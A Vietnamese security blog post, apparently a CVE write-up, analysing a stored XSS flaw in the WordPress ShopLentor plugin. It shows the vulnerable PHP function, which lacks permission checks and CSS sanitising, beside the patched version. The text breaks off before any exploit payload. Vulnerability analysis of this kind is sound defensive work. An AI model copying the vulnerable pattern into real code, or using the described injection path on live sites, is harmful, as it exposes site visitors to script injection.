<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="vi">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>CVE-2025-58990 Analysis &amp; POC - Bui Van Y</title><meta name="author" content="Bui Van Y">
<meta name="description" content="Security Vulnerability in WordPress ShopLentor Plugin."><meta name="keywords" content='analyst, plugin, xss'>
  <meta itemprop="name" content="CVE-2025-58990 Analysis & POC">
  <meta itemprop="description" content="Security Vulnerability in WordPress ShopLentor Plugin.">
  <meta itemprop="datePublished" content="2025-10-05T22:45:00+07:00">
  <meta itemprop="dateModified" content="2025-11-25T21:12:53+07:00">
  <meta itemprop="wordCount" content="1532">
  <meta itemprop="image" content="http://localhost:1313/posts/2025-10-05-cve-2025-58990/app.png">
  <meta itemprop="keywords" content="Analyst,Plugin,Xss"><meta property="og:url" content="http://localhost:1313/vi/posts/2025-10-05-cve-2025-58990/">
  <meta property="og:site_name" content="Bui Van Y">
  <meta property="og:title" content="CVE-2025-58990 Analysis & POC">
  <meta property="og:description" content="Security Vulnerability in WordPress ShopLentor Plugin.">
  <meta property="og:locale" content="vi">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-10-05T22:45:00+07:00">
    <meta property="article:modified_time" content="2025-11-25T21:12:53+07:00">
    <meta property="article:tag" content="Analyst">
    <meta property="article:tag" content="Plugin">
    <meta property="article:tag" content="Xss">
    <meta property="og:image" content="http://localhost:1313/posts/2025-10-05-cve-2025-58990/app.png">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="http://localhost:1313/posts/2025-10-05-cve-2025-58990/app.png">
  <meta name="twitter:title" content="CVE-2025-58990 Analysis & POC">
  <meta name="twitter:description" content="Security Vulnerability in WordPress ShopLentor Plugin.">
<meta name="application-name" content="Bui Van Y">
<meta name="apple-mobile-web-app-title" content="Bui Van Y"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/images/svg-spinners--wind-toy.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/vi/posts/2025-10-05-cve-2025-58990/" title="CVE-2025-58990 Analysis &amp; POC - Bui Van Y" /><link rel="prev" type="text/html" href="http://localhost:1313/vi/posts/2025-10-04-cve-2025-27006/" title="CVE-2025-27006 Analysis &amp; POC" /><link rel="next" type="text/html" href="http://localhost:1313/vi/posts/2025-10-06-cve-2025-10146/" title="CVE-2025-10146 Analysis &amp; POC" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/vi/posts/2025-10-05-cve-2025-58990/index.md" title="CVE-2025-58990 Analysis & POC - Bui Van Y"><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "CVE-2025-58990 Analysis \u0026 POC",
    "inLanguage": "vi",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "http:\/\/localhost:1313\/vi\/posts\/2025-10-05-cve-2025-58990\/"
    },"image": ["http:\/\/localhost:1313\/images\/avatar.png"],"genre": "posts","keywords": "analyst, plugin, xss","wordcount":  1532 ,
    "url": "http:\/\/localhost:1313\/vi\/posts\/2025-10-05-cve-2025-58990\/","datePublished": "2025-10-05T22:45:00+07:00","dateModified": "2025-11-25T21:12:53+07:00","publisher": {
      "@type": "Organization",
      "name": "/images/avatar.png","logo": "http:\/\/localhost:1313\/images\/avatar.png"},"author": {
        "@type": "Person",
        "name": "Bui Van Y"
      },"description": "Security Vulnerability in WordPress ShopLentor Plugin."
  }
  </script><script src="/js/head/color-scheme.min.js"></script></head>
  <body data-instant-intensity="viewport" data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/vi/" title="Bui Van Y"><img class="logo" src='/images/svg-spinners--wind-toy.svg' alt="Bui Van Y" height="32" width="32"><span class="header-title-text">Bui Van Y</span></a><span class="typeit header-subtitle"><template>w41bu1</template></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a class="menu-link" href="/vi/posts/"><i class="fa-solid fa-file-alt fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
              <a class="menu-link" href="/vi/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
              <a class="menu-link" href="/vi/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
            <input type="text" placeholder="Tìm tiêu đề hoặc nội dung..." id="search-input-desktop">
            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Tìm kiếm">
              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
            </a>
            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Xoá">
              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
            </a>
            <span class="search-button search-loading" id="search-loading-desktop">
              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
            </span>
          </li><li class="menu-item theme-switch" role="button" aria-label="Đổi chủ đề" title="Đổi chủ đề"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></li><li class="menu-item language-switch">
            <span role="button" aria-label="Chọn Ngôn ngữ" title="Chọn Ngôn ngữ"><i class="fa-solid fa-language fa-fw" aria-hidden="true"></i></span>
            <ul class="sub-menu"><li class="menu-item"><a href="/posts/2025-10-05-cve-2025-58990/" class="menu-link" title="English">English</a></li><li class="menu-item"><span class="text-secondary" title="Vietnamese">Vietnamese</span></li></ul>
          </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/vi/" title="Bui Van Y"><img class="logo" src='/images/svg-spinners--wind-toy.svg' alt="Bui Van Y" height="26" width="26"><span class="header-title-text">Bui Van Y</span></a><span class="typeit header-subtitle"><template>w41bu1</template></span></div>
      <div class="theme-switch" role="button" aria-label="Đổi chủ đề"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></div>
      <div class="menu-toggle" id="menu-toggle-mobile" role="button" aria-labelledby="menu-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
            <div class="search mobile" id="search-mobile">
              <input type="text" placeholder="Tìm tiêu đề hoặc nội dung..." id="search-input-mobile">
              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Tìm kiếm">
                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
              </a>
              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Xoá">
                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
              </a>
              <span class="search-button search-loading" id="search-loading-mobile">
                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
              </span>
            </div>
            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
              Huỷ
            </a>
          </li><li class="menu-item"><a class="menu-link" href="/vi/posts/"><i class="fa-solid fa-file-alt fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item"><a class="menu-link" href="/vi/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/vi/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item menu-system"><span class="menu-system-item language-switch">
              <span role="button" aria-label="Chọn Ngôn ngữ" title="Chọn Ngôn ngữ">Vietnamese<i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i></span>
              <select id="language-select" class="language-select" onchange="location = this.value;"><option value="/posts/2025-10-05-cve-2025-58990/">English</option><option value="/vi/posts/2025-10-05-cve-2025-58990/" selected disabled>Vietnamese</option></select>
            </span></li>
      </ul>
    </nav>
  </div>
</header><div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
  </div>
  <div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
  </div><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"><div class="details related-details open">
      <div class="details-summary related-summary">
        <i class="fa-solid fa-fire fa-fade text-danger fa-fw" aria-hidden="true"></i>
        <span class="related-title">Nội dung liên quan</span><i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></div>
      <div class="details-content related-content">
        <ul class="related-list"><li class="related-item">
              <a href="/vi/posts/2025-10-06-cve-2025-10146/" title="CVE-2025-10146 Analysis &amp; POC">CVE-2025-10146 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-10-03-cve-2025-53307/" title="CVE-2025-53307 Analysis &amp; POC">CVE-2025-53307 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-10-04-cve-2025-27006/" title="CVE-2025-27006 Analysis &amp; POC">CVE-2025-27006 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-10-02-cve-2025-6234/" title="CVE-2025-6234 Analysis &amp; POC">CVE-2025-6234 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-10-10-cve-2025-5062/" title="CVE-2025-5062 Analysis &amp; POC">CVE-2025-5062 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-10-08-cve-2025-9816/" title="CVE-2025-9816 Analysis &amp; POC">CVE-2025-9816 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-10-01-cve-2022-21661/" title="CVE-2022-21661 Analysis &amp; POC">CVE-2022-21661 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-09-30-cve-2025-2011/" title="CVE-2025-2011 Analysis &amp; POC">CVE-2025-2011 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-09-29-cve-2025-48118/" title="CVE-2025-48118 Analysis &amp; POC">CVE-2025-48118 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-09-26-cve-2025-32650/" title="CVE-2025-32650 Analysis &amp; POC">CVE-2025-32650 Analysis &amp; POC</a></li></ul>
      </div>
    </div></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>CVE-2025-58990 Analysis &amp; POC</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><a href="github.com/w41bu1" title="Tác giả" rel=" author" class="author"><img class="avatar" src='/images/avatar.png' alt="Bui Van Y" height="16" width="16">&nbsp;Bui Van Y</a></span><span class="post-included-in">&nbsp;trong <a href="/vi/categories/cve-analysis/" class="post-category" title="Danh mục - CVE Analysis"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> CVE Analysis</a></span></div><div class="post-meta-line"><span title="đăng ngày 2025-10-05 22:45:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-10-05">2025-10-05</time></span>&nbsp;<span title="Cập nhật ngày 2025-11-25 21:12:53"><i class="fa-regular fa-calendar-check fa-fw me-1" aria-hidden="true"></i><time datetime="2025-11-25">2025-11-25</time></span>&nbsp;<span title="1532 từ"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>Khoảng 1600 từ</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>8 phút</span>&nbsp;</div>
    </div><div class="featured-image"><img loading="eager" src='/posts/2025-10-05-cve-2025-58990/app.png' sizes="(max-width: 680px) 100vw, (max-width: 960px) 80vw, (max-width: 1440px) 56vw, 800px" alt="/posts/2025-10-05-cve-2025-58990/app.png" height="500" width="1544"></div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>Nội dung</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#requirements">Requirements</a></li>
    <li><a href="#analysis">Analysis</a>
      <ul>
        <li><a href="#patch-diff">Patch Diff</a></li>
        <li><a href="#how-it-work">How It Work?</a></li>
      </ul>
    </li>
    <li><a href="#exploit">Exploit</a>
      <ul>
        <li><a href="#detect-xss">Detect XSS</a></li>
      </ul>
    </li>
    <li><a href="#conclusion">Conclusion</a></li>
    <li><a href="#references">References</a></li>
  </ul>
</nav></div>
      </div><div class="content" id="content"><p>Lỗ hổng trong plugin <strong>ShopLentor</strong> trước phiên bản <strong>3.2.0</strong> cho phép kẻ tấn công có quyền <strong>contributor</strong> chèn mã độc vào CSS của block. CSS này sau đó được nạp inline vào trang và có khả năng dẫn tới Stored XSS khi được preview hoặc hiển thị trong trình duyệt.</p>
<ul>
<li><strong>CVE ID</strong>: <a href="https://www.cve.org/CVERecord?id=CVE-2025-58990" target="_blank" rel="external nofollow noopener noreferrer">CVE-2025-58990</a></li>
<li><strong>Product</strong>: <a href="https://wordpress.org/plugins/woolentor-addons/" target="_blank" rel="external nofollow noopener noreferrer">WordPress ShopLentor Plugin</a></li>
<li><strong>Vulnerability Type</strong>: Cross Site Scripting</li>
<li><strong>Affected Versions</strong>: &lt;= 3.2.0</li>
<li><strong>CVSS severity</strong>: Low (6.5)</li>
<li><strong>Required Privilege</strong>: Contributor</li>
</ul>
<h2 class="heading-element" id="requirements"><span>Requirements</span>
  <a href="#requirements" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li><strong>Local WordPress &amp; Debugging</strong>: <a href="https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/" target="_blank" rel="external nofollow noopener noreferrer">Local WordPress and Debugging</a>.</li>
<li><strong>ShopLentor</strong>: v3.2.0(vul) và v3.2.1(fix)</li>
<li><strong>diff tool</strong>: <strong>meld</strong> hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version</li>
<li><strong>Actived WooCommerce plugin</strong>: plugin bắt buộc <strong>actived</strong> trước khi cài <strong>ShopLentor Plugin</strong></li>
</ul>
<h2 class="heading-element" id="analysis"><span>Analysis</span>
  <a href="#analysis" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><h3 class="heading-element" id="patch-diff"><span>Patch Diff</span>
  <a href="#patch-diff" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>Dùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá.
Có sự khác biệt rõ ở file <strong>woolentor-blocks/includes/classes/Manage_Styles.php</strong>.</p>
<p><strong>Bản lỗi</strong>:</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">save_block_css</span><span class="p">(</span> <span class="nv">$request</span> <span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$params</span> 	<span class="o">=</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">get_params</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$post_id</span> <span class="o">=</span> <span class="nx">sanitize_text_field</span><span class="p">(</span> <span class="nv">$params</span><span class="p">[</span><span class="s1">&#39;post_id&#39;</span><span class="p">]</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Không kiểm tra quyền user
</span></span></span><span class="line"><span class="cl">    <span class="c1">// Không lọc nội dung CSS trước khi lưu
</span></span></span><span class="line"><span class="cl">    <span class="nx">update_post_meta</span><span class="p">(</span> <span class="nv">$post_id</span><span class="p">,</span> <span class="s1">&#39;_woolentor_css&#39;</span><span class="p">,</span> <span class="nv">$params</span><span class="p">[</span><span class="s1">&#39;block_css&#39;</span><span class="p">]</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$wp_filesystem</span><span class="o">-&gt;</span><span class="na">put_contents</span><span class="p">(</span> <span class="nv">$dirname</span> <span class="o">.</span> <span class="nv">$filename</span><span class="p">,</span> <span class="nv">$params</span><span class="p">[</span><span class="s1">&#39;block_css&#39;</span><span class="p">]</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div>
</div>
</div><p><strong>Bản vá</strong>:</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">save_block_css</span><span class="p">(</span> <span class="nv">$request</span> <span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$params</span> 	<span class="o">=</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">get_params</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$post_id</span> <span class="o">=</span> <span class="nx">sanitize_text_field</span><span class="p">(</span> <span class="nv">$params</span><span class="p">[</span><span class="s1">&#39;post_id&#39;</span><span class="p">]</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Chỉ admin hoặc tác giả bài viết mới được phép
</span></span></span><span class="line"><span class="cl">    <span class="nv">$post</span> <span class="o">=</span> <span class="nx">get_post</span><span class="p">(</span> <span class="nv">$post_id</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nv">$post</span> <span class="o">||</span> <span class="p">(</span> <span class="o">!</span> <span class="nx">current_user_can</span><span class="p">(</span><span class="s1">&#39;manage_options&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">get_current_user_id</span><span class="p">()</span> <span class="o">!==</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span> <span class="nv">$post</span><span class="o">-&gt;</span><span class="na">post_author</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">[</span><span class="s1">&#39;success&#39;</span> <span class="o">=&gt;</span> <span class="k">false</span><span class="p">,</span> <span class="s1">&#39;message&#39;</span> <span class="o">=&gt;</span> <span class="nx">__</span><span class="p">(</span><span class="s1">&#39;No permission&#39;</span><span class="p">)];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Lọc dữ liệu trước khi lưu
</span></span></span><span class="line"><span class="cl">    <span class="nv">$block_css</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">sanitize_css_content</span><span class="p">(</span> <span class="nv">$params</span><span class="p">[</span><span class="s1">&#39;block_css&#39;</span><span class="p">]</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">update_post_meta</span><span class="p">(</span> <span class="nv">$post_id</span><span class="p">,</span> <span class="s1">&#39;_woolentor_css&#39;</span><span class="p">,</span> <span class="nv">$block_css</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$wp_filesystem</span><span class="o">-&gt;</span><span class="na">put_contents</span><span class="p">(</span> <span class="nv">$dirname</span> <span class="o">.</span> <span class="nv">$filename</span><span class="p">,</span> <span class="nv">$block_css</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Mở rộng hoặc thu gọn khối mã" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
</div>
</div><p>Bản vá dùng <code>current_user_can(manage_options)</code> để kiểm tra có phải <strong>admin</strong> không</p>
<ul>
<li>Nếu user là <strong>admin</strong> =&gt; vế đầu <code>! current_user_can('manage_options') = false</code> =&gt; cả biểu thức <code>&amp;&amp; = false</code> =&gt; qua được.</li>
<li>Nếu user là <strong>author</strong> =&gt; vế sau <code>get_current_user_id() !== (int) $post-&gt;post_author = false</code> =&gt; cả biểu thức <code>&amp;&amp; = false</code> =&gt; qua được.</li>
</ul>
<figure><img src="/posts/2025-10-05-cve-2025-58990/patch_diff.png"
    alt="Patch Diff"><figcaption>
      <p>Patch Diff</p>
    </figcaption>
</figure>

<h3 class="heading-element" id="how-it-work"><span>How It Work?</span>
  <a href="#how-it-work" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
